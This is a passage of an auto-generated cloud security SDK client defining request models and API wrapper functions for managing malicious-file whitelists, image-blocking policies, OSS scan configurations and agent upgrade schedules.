  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var body : map[string]any = {};
  if (!Util.isUnset(request.persistenceDay)) {
    body['PersistenceDay'] = request.persistenceDay;
  }
  if (!Util.isUnset(request.registryId)) {
    body['RegistryId'] = request.registryId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
    body = OpenApiUtil.parseToMap(body),
  };
  var params = new OpenApi.Params{
    action = 'UpdateJenkinsImageRegistryPersistenceDay',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Modifies the retention period of images that are stored in a Jenkins image repository.
 *
 * @param request UpdateJenkinsImageRegistryPersistenceDayRequest
 * @return UpdateJenkinsImageRegistryPersistenceDayResponse
 */
async function updateJenkinsImageRegistryPersistenceDay(request: UpdateJenkinsImageRegistryPersistenceDayRequest): UpdateJenkinsImageRegistryPersistenceDayResponse {
  var runtime = new Util.RuntimeOptions{};
  return updateJenkinsImageRegistryPersistenceDayWithOptions(request, runtime);
}

model UpdateMaliciousFileWhitelistConfigRequest {
  configId?: long(name='ConfigId', description='The ID of the whitelist rule. If you do not specify this parameter, a whitelist rule is created.', example='1'),
  eventName?: string(name='EventName', description='The name of the alert.

*   Set the value to ALL, which indicates all alert types.', example='ALL'),
  field?: string(name='Field', description='The field that you want to use in the whitelist rule.', example='fileMd5'),
  fieldValue?: string(name='FieldValue', description='The value of the field that you want to use in the whitelist rule.', example='b2cf9747ee49d8d9b105cf16e078cc16'),
  operator?: string(name='Operator', description='The logical operator that you want to use in the whitelist rule.

*   Set the value to strEqual, which indicates the equality operator (=).', example='strEqual'),
  source?: string(name='Source', description='The feature to which this operation belongs.

*   Set the value to agentless, which indicates the agentless detection feature.', example='agentless'),
  targetType?: string(name='TargetType', description='The type of the assets on which you want the whitelist rule to take effect. Valid values:

*   ALL: all assets
*   SELECTION_KEY: selected assets', example='ALL'),
  targetValue?: string(name='TargetValue', description='The assets on which you want the whitelist rule to take effect. Valid values:

*   ALL: all assets
*   Others: selected assets', example='ALL'),
}

model UpdateMaliciousFileWhitelistConfigResponseBody = {
  code?: string(name='Code', description='The response code. The status code **200** indicates that the request was successful. Other status codes indicate that the request failed. You can identify the cause of the failure based on the status code.', example='200'),
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code.', example='200'),
  message?: string(name='Message', description='The returned message.', example='successful'),
  requestId?: string(name='RequestId', description='The request ID.', example='A4EB8B1C-1DEC-5E18-BCD0-XXXXXXXXX'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**
*   **false**', example='true'),
}

model UpdateMaliciousFileWhitelistConfigResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: UpdateMaliciousFileWhitelistConfigResponseBody(name='body'),
}

/**
 * @summary Modifies an alert whitelist rule of sensitive files that are detected by using the agentless detection feature.
 *
 * @param request UpdateMaliciousFileWhitelistConfigRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return UpdateMaliciousFileWhitelistConfigResponse
 */
async function updateMaliciousFileWhitelistConfigWithOptions(request: UpdateMaliciousFileWhitelistConfigRequest, runtime: Util.RuntimeOptions): UpdateMaliciousFileWhitelistConfigResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.configId)) {
    query['ConfigId'] = request.configId;
  }
  if (!Util.isUnset(request.eventName)) {
    query['EventName'] = request.eventName;
  }
  if (!Util.isUnset(request.field)) {
    query['Field'] = request.field;
  }
  if (!Util.isUnset(request.fieldValue)) {
    query['FieldValue'] = request.fieldValue;
  }
  if (!Util.isUnset(request.operator)) {
    query['Operator'] = request.operator;
  }
  if (!Util.isUnset(request.source)) {
    query['Source'] = request.source;
  }
  if (!Util.isUnset(request.targetType)) {
    query['TargetType'] = request.targetType;
  }
  if (!Util.isUnset(request.targetValue)) {
    query['TargetValue'] = request.targetValue;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'UpdateMaliciousFileWhitelistConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Modifies an alert whitelist rule of sensitive files that are detected by using the agentless detection feature.
 *
 * @param request UpdateMaliciousFileWhitelistConfigRequest
 * @return UpdateMaliciousFileWhitelistConfigResponse
 */
async function updateMaliciousFileWhitelistConfig(request: UpdateMaliciousFileWhitelistConfigRequest): UpdateMaliciousFileWhitelistConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return updateMaliciousFileWhitelistConfigWithOptions(request, runtime);
}

model UpdateOpaStrategyNewRequest {
  alarmDetail?: {
    baseline?: {
      item?: [ 
        {
          id?: string(name='Id', description='The ID of the baseline check item.

>  You can call the [GetOpaClusterBaseLineList](https://help.aliyun.com/document_detail/2539883.html) operation to query the ID.', example='hc.image.checklist.identify.hc_exploit_couchdb_linux.item'),
          name?: string(name='Name', description='The name of the baseline check item.

>  You can call the [GetOpaClusterBaseLineList](https://help.aliyun.com/document_detail/2539883.html) operation to query the name.', example='passwd'),
        }
      ](name='Item', description='The baseline check items.'),
      riskLevel?: [ string ](name='RiskLevel', description='The risk levels.'),
    }(name='Baseline', description='The baseline risks.'),
    buildRisk?: {
      item?: [ 
        {
          id?: string(name='Id', description='The ID of the image build risk.

>  You can call the [ListImageBuildRiskItem](~~ListImageBuildRiskItem~~) operation to query the ID of the malicious sample.', example='key'),
          name?: string(name='Name', description='The name of the image build risk.

>  You can call the [ListImageBuildRiskItem](~~ListImageBuildRiskItem~~) operation to query the ID of the malicious sample.', example='name'),
        }
      ](name='Item', description='The configuration of image build risk.'),
      riskLevel?: [ string ](name='RiskLevel', description='The risk levels.'),
    }(name='BuildRisk', description='The configuration of image build risk.'),
    maliciousFile?: {
      item?: [ 
        {
          id?: string(name='Id', description='The ID of the malicious sample.

>  You can call the [DescribeMatchedMaliciousNames](~~DescribeMatchedMaliciousNames~~) operation to query the ID.', example='65201'),
          name?: string(name='Name', description='The name of the malicious sample.

>  You can call the [DescribeMatchedMaliciousNames](~~DescribeMatchedMaliciousNames~~) operation to query the name.', example='abnormal binary file'),
        }
      ](name='Item', description='The malicious samples.'),
      riskLevel?: [ string ](name='RiskLevel', description='The risk levels.'),
    }(name='MaliciousFile', description='The malicious sample risks.'),
    sensitiveFile?: {
      item?: [ 
        {
          id?: string(name='Id', description='The ID of the sensitive files.

>  You can call the [GetSensitiveDefineRuleConfig](~~GetSensitiveDefineRuleConfig~~) operation to query the ID of the malicious sample.', example='key'),
          name?: string(name='Name', description='The name of the sensitive files.

>  You can call the [GetSensitiveDefineRuleConfig](~~GetSensitiveDefineRuleConfig~~) operation to query the ID of the malicious sample.', example='name'),
        }
      ](name='Item', description='The configuration of sensitive file.'),
      riskLevel?: [ string ](name='RiskLevel', description='The risk levels.'),
    }(name='SensitiveFile', description='The configuration of sensitive file.'),
    vul?: {
      item?: [ 
        {
          id?: string(name='Id', description='The ID of the vulnerability.

>  You can call the [DescribeVulListPage](https://help.aliyun.com/document_detail/471928.html) operation to query the ID.', example='CVE-2023-36034'),
          name?: string(name='Name', description='The name of the vulnerability.

>  You can call the [DescribeVulListPage](https://help.aliyun.com/document_detail/471928.html) operation to query the name.', example='oval:com.redhat.rhsa:def:20227002'),
        }
      ](name='Item', description='The vulnerabilities.'),
      riskClass?: [ 
        {
          id?: string(name='Id', description='The ID of the vulnerability types. Valid values:

*   **cve**: system vulnerability
*   **app**: application vulnerability', example='cve'),
          name?: string(name='Name', description='The name of the vulnerability. Valid values:

*   **system vulnerability**
*   **application vulnerability**', example='system vulnerability'),
        }
      ](name='RiskClass', description='Risk type of vulnerability.'),
      riskLevel?: [ string ](name='RiskLevel', description='The risk levels.'),
    }(name='Vul', description='The vulnerability risks.'),
  }(name='AlarmDetail', description='The risks that you want to detect by using the rule.'),
  clusterId?: string(name='ClusterId', description='The cluster ID.

> This parameter is deprecated. You can use the Scopes parameter to specify a scope in which cluster parameters take effect.', example='c870ec78ecbcb41d2a35c679823ef****'),
  clusterName?: string(name='ClusterName', description='The cluster name.

> This parameter is deprecated.', example='docker-law'),
  description?: string(name='Description', description='The rule description.', example='4566'),
  imageName?: [ string ](name='ImageName', description='The image names.'),
  label?: [ string ](name='Label', description='The image tags.'),
  maliciousImage?: boolean(name='MaliciousImage', description='Specifies whether the rule supports malicious Internet images. Valid values:

*   **true**
*   **false**', example='true'),
  ruleAction?: int32(name='RuleAction', description='The action that is performed when the rule is hit. Valid values:

*   **1**: alert
*   **2**: block
*   **3**: allow', example='1'),
  scopes?: [ 
    {
      ackPolicyInstanceId?: string(name='AckPolicyInstanceId', description='The ID of the cluster node to which the rule is applied.

>  You can call the [GetOpaStrategyDetailNew](~~GetOpaStrategyDetailNew~~) operation to query the ID of the cluster node to which the rule is applied.', example='ack-1'),
      allNamespace?: int32(name='AllNamespace', description='Specifies whether all namespaces are included. Valid values:

*   **0**: Not all namespaces are included.
*   **1**: All namespaces are included.', example='1'),
      clusterId?: string(name='ClusterId', description='The cluster ID.

>  You can call the [DescribeGroupedContainerInstances](~~DescribeGroupedContainerInstances~~) operation to query the cluster ID.', example='cdcb56a931c**'),
      namespaceList?: [ string ](name='NamespaceList', description='The namespaces.

> This parameter is valid only when the AllNamespace parameter is set to 0.'),
    }
  ](name='Scopes', description='The application scope.'),
  strategyId?: long(name='StrategyId', description='The ID of the rule.

>  You can call the [ListOpaClusterStrategyNew](https://help.aliyun.com/document_detail/2623574.html) operation to query the ID.', example='1003'),
  strategyName?: string(name='StrategyName', description='The rule name.', example='test'),
  strategyTemplateId?: long(name='StrategyTemplateId', description='The ID of the rule template.

>  You can call the [GetOpaStrategyTemplateSummary](https://help.aliyun.com/document_detail/2539952.html) operation to query the ID of the rule template.', example='109'),
  unScanedImage?: boolean(name='UnScanedImage', description='Specifies whether the rule supports unscanned images. Valid values:

*   **true**
*   **false**', example='true'),
  whiteList?: [ string ](name='WhiteList', description='The whitelists.'),
}

model UpdateOpaStrategyNewShrinkRequest {
  alarmDetailShrink?: string(name='AlarmDetail', description='The risks that you want to detect by using the rule.'),
  clusterId?: string(name='ClusterId', description='The cluster ID.

> This parameter is deprecated. You can use the Scopes parameter to specify a scope in which cluster parameters take effect.', example='c870ec78ecbcb41d2a35c679823ef****'),
  clusterName?: string(name='ClusterName', description='The cluster name.

> This parameter is deprecated.', example='docker-law'),
  description?: string(name='Description', description='The rule description.', example='4566'),
  imageName?: [ string ](name='ImageName', description='The image names.'),
  label?: [ string ](name='Label', description='The image tags.'),
  maliciousImage?: boolean(name='MaliciousImage', description='Specifies whether the rule supports malicious Internet images. Valid values:

*   **true**
*   **false**', example='true'),
  ruleAction?: int32(name='RuleAction', description='The action that is performed when the rule is hit. Valid values:

*   **1**: alert
*   **2**: block
*   **3**: allow', example='1'),
  scopes?: [ 
    {
      ackPolicyInstanceId?: string(name='AckPolicyInstanceId', description='The ID of the cluster node to which the rule is applied.

>  You can call the [GetOpaStrategyDetailNew](~~GetOpaStrategyDetailNew~~) operation to query the ID of the cluster node to which the rule is applied.', example='ack-1'),
      allNamespace?: int32(name='AllNamespace', description='Specifies whether all namespaces are included. Valid values:

*   **0**: Not all namespaces are included.
*   **1**: All namespaces are included.', example='1'),
      clusterId?: string(name='ClusterId', description='The cluster ID.

>  You can call the [DescribeGroupedContainerInstances](~~DescribeGroupedContainerInstances~~) operation to query the cluster ID.', example='cdcb56a931c**'),
      namespaceList?: [ string ](name='NamespaceList', description='The namespaces.

> This parameter is valid only when the AllNamespace parameter is set to 0.'),
    }
  ](name='Scopes', description='The application scope.'),
  strategyId?: long(name='StrategyId', description='The ID of the rule.

>  You can call the [ListOpaClusterStrategyNew](https://help.aliyun.com/document_detail/2623574.html) operation to query the ID.', example='1003'),
  strategyName?: string(name='StrategyName', description='The rule name.', example='test'),
  strategyTemplateId?: long(name='StrategyTemplateId', description='The ID of the rule template.

>  You can call the [GetOpaStrategyTemplateSummary](https://help.aliyun.com/document_detail/2539952.html) operation to query the ID of the rule template.', example='109'),
  unScanedImage?: boolean(name='UnScanedImage', description='Specifies whether the rule supports unscanned images. Valid values:

*   **true**
*   **false**', example='true'),
  whiteList?: [ string ](name='WhiteList', description='The whitelists.'),
}

model UpdateOpaStrategyNewResponseBody = {
  code?: string(name='Code', description='The status code returned. The status code **200** indicates that the request was successful. Other status codes indicate that the request failed. You can identify the cause of the failure based on the status code.', example='200'),
  data?: [ string ](name='Data', description='The IDs of the clusters that failed to be updated.'),
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code.', example='200'),
  message?: string(name='Message', description='The returned message.', example='success'),
  requestId?: string(name='RequestId', description='The request ID.', example='F75B5FF5-DCB2-59CE-8978-08510707A9E6'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**
*   **false**', example='true'),
}

model UpdateOpaStrategyNewResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: UpdateOpaStrategyNewResponseBody(name='body'),
}

/**
 * @summary Updates the blocking rule for at-risk images.
 *
 * @param tmpReq UpdateOpaStrategyNewRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return UpdateOpaStrategyNewResponse
 */
async function updateOpaStrategyNewWithOptions(tmpReq: UpdateOpaStrategyNewRequest, runtime: Util.RuntimeOptions): UpdateOpaStrategyNewResponse {
  Util.validateModel(tmpReq);
  var request = new UpdateOpaStrategyNewShrinkRequest{};
  OpenApiUtil.convert(tmpReq, request);
  if (!Util.isUnset(tmpReq.alarmDetail)) {
    request.alarmDetailShrink = OpenApiUtil.arrayToStringWithSpecifiedStyle(tmpReq.alarmDetail, 'AlarmDetail', 'json');
  }
  var query = {};
  if (!Util.isUnset(request.alarmDetailShrink)) {
    query['AlarmDetail'] = request.alarmDetailShrink;
  }
  if (!Util.isUnset(request.clusterId)) {
    query['ClusterId'] = request.clusterId;
  }
  if (!Util.isUnset(request.clusterName)) {
    query['ClusterName'] = request.clusterName;
  }
  if (!Util.isUnset(request.description)) {
    query['Description'] = request.description;
  }
  if (!Util.isUnset(request.imageName)) {
    query['ImageName'] = request.imageName;
  }
  if (!Util.isUnset(request.label)) {
    query['Label'] = request.label;
  }
  if (!Util.isUnset(request.maliciousImage)) {
    query['MaliciousImage'] = request.maliciousImage;
  }
  if (!Util.isUnset(request.ruleAction)) {
    query['RuleAction'] = request.ruleAction;
  }
  if (!Util.isUnset(request.scopes)) {
    query['Scopes'] = request.scopes;
  }
  if (!Util.isUnset(request.strategyId)) {
    query['StrategyId'] = request.strategyId;
  }
  if (!Util.isUnset(request.strategyName)) {
    query['StrategyName'] = request.strategyName;
  }
  if (!Util.isUnset(request.strategyTemplateId)) {
    query['StrategyTemplateId'] = request.strategyTemplateId;
  }
  if (!Util.isUnset(request.unScanedImage)) {
    query['UnScanedImage'] = request.unScanedImage;
  }
  if (!Util.isUnset(request.whiteList)) {
    query['WhiteList'] = request.whiteList;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'UpdateOpaStrategyNew',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Updates the blocking rule for at-risk images.
 *
 * @param request UpdateOpaStrategyNewRequest
 * @return UpdateOpaStrategyNewResponse
 */
async function updateOpaStrategyNew(request: UpdateOpaStrategyNewRequest): UpdateOpaStrategyNewResponse {
  var runtime = new Util.RuntimeOptions{};
  return updateOpaStrategyNewWithOptions(request, runtime);
}

model UpdateOssScanConfigRequest {
  allKeyPrefix?: boolean(name='AllKeyPrefix', description='Specifies whether to match the prefixes of all objects.', example='true'),
  bucketNameList?: [ string ](name='BucketNameList', description='The names of the buckets.'),
  decompressMaxFileCount?: int32(name='DecompressMaxFileCount', description='The maximum number of objects that can be extracted from a package. Valid values: 1 to 1000. If the value is reached, the decompression operation immediately finishes. The detection of extracted objects is not affected.', example='100'),
  decompressMaxLayer?: int32(name='DecompressMaxLayer', description='The maximum number of decompression levels when multi-level packages are decompressed. Valid values: 1 to 5. If the value is reached, the decompression operation immediately finishes. The detection of extracted objects is not affected.', example='1'),
  decryptionList?: [ string ](name='DecryptionList', description='The decryption methods.'),
  enable?: int32(name='Enable', description='Specifies whether to enable the bucket check policy. Valid values:

*   **1**: enables the bucket check policy.
*   **0**: disables the bucket check policy.', example='0'),
  endTime?: string(name='EndTime', description='The end time of the check. Specify the time in the HH:mm:ss format.', example='00:00:01'),
  id?: string(name='Id', description='The policy ID.', example='65778'),
  keyPrefixList?: [ string ](name='KeyPrefixList', description='The prefixes of the objects.'),
  keySuffixList?: [ string ](name='KeySuffixList', description='The suffixes of the objects that you want to check.'),
  lastModifiedStartTime?: long(name='LastModifiedStartTime', description='The timestamp. The objects whose last modification time is later than the specified value are detected. Unit: milliseconds.', example='1724301769834'),
  name?: string(name='Name', description='The policy name.', example='nacos****'),
  scanDayList?: [ int32 ](name='ScanDayList', description='The time when the check is performed. The value specifies the days of the week.'),
  startTime?: string(name='StartTime', description='The start time of the check. Specify the time in the HH:mm:ss format.', example='00:00:00'),
}

model UpdateOssScanConfigResponseBody = {
  requestId?: string(name='RequestId', description='The request ID.', example='FFA14F61-4E2F-54C7-9276-81C60BAC****'),
}

model UpdateOssScanConfigResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: UpdateOssScanConfigResponseBody(name='body'),
}

/**
 * @summary Modifies a policy of detecting Object Storage Service (OSS) objects by using the SDK for malicious file detection feature.
 *
 * @param request UpdateOssScanConfigRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return UpdateOssScanConfigResponse
 */
async function updateOssScanConfigWithOptions(request: UpdateOssScanConfigRequest, runtime: Util.RuntimeOptions): UpdateOssScanConfigResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.allKeyPrefix)) {
    query['AllKeyPrefix'] = request.allKeyPrefix;
  }
  if (!Util.isUnset(request.bucketNameList)) {
    query['BucketNameList'] = request.bucketNameList;
  }
  if (!Util.isUnset(request.decompressMaxFileCount)) {
    query['DecompressMaxFileCount'] = request.decompressMaxFileCount;
  }
  if (!Util.isUnset(request.decompressMaxLayer)) {
    query['DecompressMaxLayer'] = request.decompressMaxLayer;
  }
  if (!Util.isUnset(request.decryptionList)) {
    query['DecryptionList'] = request.decryptionList;
  }
  if (!Util.isUnset(request.enable)) {
    query['Enable'] = request.enable;
  }
  if (!Util.isUnset(request.endTime)) {
    query['EndTime'] = request.endTime;
  }
  if (!Util.isUnset(request.id)) {
    query['Id'] = request.id;
  }
  if (!Util.isUnset(request.keyPrefixList)) {
    query['KeyPrefixList'] = request.keyPrefixList;
  }
  if (!Util.isUnset(request.keySuffixList)) {
    query['KeySuffixList'] = request.keySuffixList;
  }
  if (!Util.isUnset(request.lastModifiedStartTime)) {
    query['LastModifiedStartTime'] = request.lastModifiedStartTime;
  }
  if (!Util.isUnset(request.name)) {
    query['Name'] = request.name;
  }
  if (!Util.isUnset(request.scanDayList)) {
    query['ScanDayList'] = request.scanDayList;
  }
  if (!Util.isUnset(request.startTime)) {
    query['StartTime'] = request.startTime;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'UpdateOssScanConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Modifies a policy of detecting Object Storage Service (OSS) objects by using the SDK for malicious file detection feature.
 *
 * @param request UpdateOssScanConfigRequest
 * @return UpdateOssScanConfigResponse
 */
async function updateOssScanConfig(request: UpdateOssScanConfigRequest): UpdateOssScanConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return updateOssScanConfigWithOptions(request, runtime);
}

model UpdatePostPaidBindRelRequest {
  autoBind?: int32(name='AutoBind', description='Enable automatic binding for new assets. Values:

- **0**: Off
- **1**: On', example='1'),
  autoBindVersion?: int32(name='AutoBindVersion', description='Version to automatically bind when adding new assets. Values:
- **1**: Basic Edition 
- **3**: Enterprise Edition
- **5**: Advanced Edition
- **6**: Antivirus Edition    
- **7**: Container Edition', example='3'),
  bindAction?: [ 
    {
      bindAll?: boolean(name='BindAll', description='Whether to bind all. Default is **false**. Values:

- **true**: Yes
- **false**: No', example='true'),
      uuidList?: [ string ](name='UuidList', description='List of specified server UUIDs.'),
      version?: string(name='Version', description='The Cloud Security Center protection version that needs to be bound. Values:  
- **1**: Basic Edition 
- **3**: Enterprise Edition
- **5**: Advanced Edition
- **6**: Antivirus Edition    
- **7**: Container Edition', example='3'),
    }
  ](name='BindAction', description='Parameters for the binding action.'),
}

model UpdatePostPaidBindRelResponseBody = {
  bindCount?: long(name='BindCount', description='Number of servers successfully bound', example='2'),
  requestId?: string(name='RequestId', description='The ID of this request, a unique identifier generated by Alibaba Cloud for this request, which can be used for troubleshooting and problem localization.', example='09969D2C-4FAD-429E-BFBF-9A60DEF8BF6F'),
  resultCode?: int32(name='ResultCode', description='Binding result status code. Values:

- **0**: Success
- **1**: Parameter error
- **2**: Insufficient server authorization count
- **3**: Insufficient server core authorization
- **4**: Postpaid not enabled
- **5**: Service suspended due to arrears
- **6**: Serverless protection not enabled
- **7**: Pay-as-you-go service for host and container security not enabled
- **-1**: Binding exception', example='0'),
}

model UpdatePostPaidBindRelResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: UpdatePostPaidBindRelResponseBody(name='body'),
}

/**
 * @summary Change Postpaid Asset Authorization Version
 *
 * @param request UpdatePostPaidBindRelRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return UpdatePostPaidBindRelResponse
 */
async function updatePostPaidBindRelWithOptions(request: UpdatePostPaidBindRelRequest, runtime: Util.RuntimeOptions): UpdatePostPaidBindRelResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.autoBind)) {
    query['AutoBind'] = request.autoBind;
  }
  if (!Util.isUnset(request.autoBindVersion)) {
    query['AutoBindVersion'] = request.autoBindVersion;
  }
  if (!Util.isUnset(request.bindAction)) {
    query['BindAction'] = request.bindAction;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'UpdatePostPaidBindRel',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Change Postpaid Asset Authorization Version
 *
 * @param request UpdatePostPaidBindRelRequest
 * @return UpdatePostPaidBindRelResponse
 */
async function updatePostPaidBindRel(request: UpdatePostPaidBindRelRequest): UpdatePostPaidBindRelResponse {
  var runtime = new Util.RuntimeOptions{};
  return updatePostPaidBindRelWithOptions(request, runtime);
}

model UpdatePublishAutoUpgradeRequest {
  autoUpgrade?: int32(name='AutoUpgrade', description='Specifies whether to enable automatic upgrade. Valid values:

*   **1**: yes
*   **0**: no', example='1'),
}

model UpdatePublishAutoUpgradeResponseBody = {
  requestId?: string(name='RequestId', description='The request ID.', example='1EE7B150-D67E-53FD-A52D-3E8E669A****'),
}

model UpdatePublishAutoUpgradeResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: UpdatePublishAutoUpgradeResponseBody(name='body'),
}

/**
 * @summary Enables or disables automatic upgrade.
 *
 * @param request UpdatePublishAutoUpgradeRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return UpdatePublishAutoUpgradeResponse
 */
async function updatePublishAutoUpgradeWithOptions(request: UpdatePublishAutoUpgradeRequest, runtime: Util.RuntimeOptions): UpdatePublishAutoUpgradeResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.autoUpgrade)) {
    query['AutoUpgrade'] = request.autoUpgrade;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'UpdatePublishAutoUpgrade',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Enables or disables automatic upgrade.
 *
 * @param request UpdatePublishAutoUpgradeRequest
 * @return UpdatePublishAutoUpgradeResponse
 */
async function updatePublishAutoUpgrade(request: UpdatePublishAutoUpgradeRequest): UpdatePublishAutoUpgradeResponse {
  var runtime = new Util.RuntimeOptions{};
  return updatePublishAutoUpgradeWithOptions(request, runtime);
}

model UpdatePublishBatchRequest {
  batchId?: long(name='BatchId', description='The ID of the release batch.', example='52370'),
  batchName?: string(name='BatchName', description='The name of the release batch.', example='xxx'),
  interval?: int32(name='Interval', description='The interval between two release batches.', example='60'),
  operationBase?: int32(name='OperationBase', description='The asset selection dimension. Valid values:

*   **0**: instance
*   **1**: machine group
*   **2**: VPC-based instance ID', example='0'),
}

model UpdatePublishBatchResponseBody = {
  requestId?: string(name='RequestId', description='The request ID.', example='3956048F-9D73-5EDB-834B-4827BB******'),
}

model UpdatePublishBatchResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: UpdatePublishBatchResponseBody(name='body'),
}

/**
 * @summary Updates a release batch.
 *
 * @param request UpdatePublishBatchRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return UpdatePublishBatchResponse
 */
async function updatePublishBatchWithOptions(request: UpdatePublishBatchRequest, runtime: Util.RuntimeOptions): UpdatePublishBatchResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.batchId)) {
    query['BatchId'] = request.batchId;
  }
  if (!Util.isUnset(request.batchName)) {
    query['BatchName'] = request.batchName;
  }
  if (!Util.isUnset(request.interval)) {
    query['Interval'] = request.interval;
  }
  if (!Util.isUnset(request.operationBase)) {
    query['OperationBase'] = request.operationBase;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'UpdatePublishBatch',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Updates a release batch.
 *
 * @param request UpdatePublishBatchRequest
 * @return UpdatePublishBatchResponse
 */
async function updatePublishBatch(request: UpdatePublishBatchRequest): UpdatePublishBatchResponse {
  var runtime = new Util.RuntimeOptions{};
  return updatePublishBatchWithOptions(request, runtime);
}

model UpdatePublishCronRequest {
  cron?: string(name='Cron', description='The cron expression that is used to specify the start time of the upgrade.

This parameter is required.', example='0 5 10 * * ?'),
  cronDay?: string(name='CronDay', description='The day of a week on which you want to perform the upgrade. Valid values:

*   **MON**
*   **TUE**
*   **WED**
*   **THU**
*   **FRI**
*   **SAT**
*   **SUN**', example='SUN'),
  cronTime?: long(name='CronTime', description='The start timestamp. Unit: milliseconds.', example='1657407600000'),
  cronType?: string(name='CronType', description='The type of the upgrade cycle. Valid values:

*   **day**: every day
*   **week**: every week', example='day'),
  duration?: int32(name='Duration', description='The duration of the upgrade. Unit: hours.

This parameter is required.', example='24'),
}

model UpdatePublishCronResponseBody = {
  requestId?: string(name='RequestId', description='The request ID.', example='1052B989-305B-50A5-B5F5-998450******'),
}

model UpdatePublishCronResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: UpdatePublishCronResponseBody(name='body'),
}

/**
 * @summary Modifies the configuration of the client upgrade time. If you want to call this operation, contact technical support.
 *
 * @param request UpdatePublishCronRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return UpdatePublishCronResponse
 */
async function updatePublishCronWithOptions(request: UpdatePublishCronRequest, runtime: Util.RuntimeOptions): UpdatePublishCronResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.cron)) {
    query['Cron'] = request.cron;
  }
  if (!Util.isUnset(request.cronDay)) {
    query['CronDay'] = request.cronDay;
  }
  if (!Util.isUnset(request.cronTime)) {
    query['CronTime'] = request.cronTime;
  }
